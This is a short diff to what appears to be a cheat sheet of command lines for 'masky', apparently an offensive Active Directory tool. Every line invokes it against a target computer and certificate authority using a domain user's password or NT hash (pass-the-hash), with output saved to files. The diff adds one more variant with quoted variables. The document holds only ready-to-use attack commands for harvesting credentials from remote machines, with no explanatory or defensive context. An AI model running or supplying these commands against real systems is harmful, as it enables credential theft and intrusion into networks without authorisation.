@@ -3,3 +3,4 @@ masky -d $DOMAIN -u $USER -p $PASSWORD -dc-ip $DC_IP -ca $CA_NAME $TARGET_COMPUT
 masky -d $DOMAIN -u $USER -H $NT_HASH -dc-ip $DC_IP -ca $CA_NAME $TARGET_COMPUTER
 masky -d $DOMAIN -u $USER -p $PASSWORD -dc-ip $DC_IP -ca $CA_NAME -o output/ $TARGET_COMPUTER
 masky -d $DOMAIN -u $USER -dc-ip $DC_HOST -t 5 -o results.txt -ca "srv-01\srv-01-CA"
+masky -d "$DOMAIN" -u "$USER" -dc-ip "$IP" -t 5 -o results.txt -ca "$TARGET\\$CA_NAME"
